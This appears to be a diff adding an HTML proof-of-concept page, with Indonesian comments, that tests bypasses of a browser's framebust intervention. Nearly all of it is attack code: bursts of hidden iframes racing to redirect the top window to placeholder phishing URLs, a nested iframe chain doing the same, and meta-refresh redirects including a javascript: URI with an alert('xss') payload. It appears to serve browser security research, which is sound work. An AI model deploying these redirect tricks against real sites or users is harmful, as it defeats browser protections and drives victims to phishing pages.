@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Framebust Bypass PoC</title>
+</head>
+<body>
+<h2>Bug 2: Framebust Intervention Bypass</h2>
+<p>Test apakah kita bisa bypass framebust blocker</p>
+
+<button onclick="test1()" style="padding:15px;font-size:16px;">
+  Test 1: Rapid framebust override
+</button><br><br>
+
+<button onclick="test2()" style="padding:15px;font-size:16px;">
+  Test 2: Nested iframe framebust
+</button><br><br>
+
+<button onclick="test3()" style="padding:15px;font-size:16px;">
+  Test 3: meta refresh framebust
+</button>
+
+<div id="status" style="margin:20px 0;font-family:monospace;"></div>
+
+<script>
+function status(msg) {
+  document.getElementById('status').innerHTML += msg + '<br>';
+}
+
+// Test 1: Buat banyak iframe yang mencoba redirect parent
+// Tujuan: race condition pada blocked_url_ overwrite
+function test1() {
+  status('Creating rapid framebust iframes...');
+  
+  for (var i = 0; i < 5; i++) {
+    (function(idx) {
+      setTimeout(() => {
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.srcdoc = `
+          <script>
+            try {
+              // Iframe mencoba redirect parent ke URL berbeda
+              top.location = 'https://evil-${idx}.example.com/phish';
+            } catch(e) {}
+          <\/script>
+        `;
+        document.body.appendChild(iframe);
+        status('iframe ' + idx + ' created');
+      }, idx * 50); // Rapid succession
+    })(i);
+  }
+  
+  status('Cek: apakah muncul message? URL mana yang ditampilkan?');
+  status('Jika user tap "Open" — URL mana yang dibuka?');
+}
+
+// Test 2: Nested iframe chain
+// grandchild → child → parent redirect chain
+function test2() {
+  status('Creating nested iframe chain...');
+  
+  var iframe1 = document.createElement('iframe');
+  iframe1.style.width = '100%';
+  iframe1.style.height = '200px';
+  iframe1.srcdoc = `
+    <p>Level 1 iframe</p>
+    <iframe srcdoc="
+      <p>Level 2 iframe</p>
+      <script>
+        // Nested iframe mencoba redirect top
+        setTimeout(() => {
+          try {
+            top.location = 'https://phishing.example.com/login';
+          } catch(e) {
+            document.write('Blocked: ' + e.message);
+          }
+        }, 500);
+      </script>
+    "></iframe>
+  `;
+  document.body.appendChild(iframe1);
+  
+  status('Nested iframes created - watch for framebust message');
+}
+
+// Test 3: meta refresh sebagai alternative framebust
+function test3() {
+  status('Testing meta refresh framebust...');
+  
+  var iframe = document.createElement('iframe');
+  iframe.style.width = '100%';
+  iframe.style.height = '100px';
+  // meta refresh tidak menggunakan JavaScript
+  // Apakah framebust intervention juga menangkap ini?
+  iframe.srcdoc = `
+    <meta http-equiv="refresh" content="0;url=https://evil.example.com">
+    <p>Meta refresh framebust test</p>
+  `;
+  document.body.appendChild(iframe);
+  
+  // Juga test: meta refresh ke javascript: URI
+  setTimeout(() => {
+    var iframe2 = document.createElement('iframe');
+    iframe2.style.display = 'none';
+    iframe2.srcdoc = `
+      <meta http-equiv="refresh" content="0;url=javascript:alert('xss')">
+    `;
+    document.body.appendChild(iframe2);
+    status('Meta refresh + javascript: URI test added');
+  }, 1000);
+}
+</script>
+</body>
+</html>
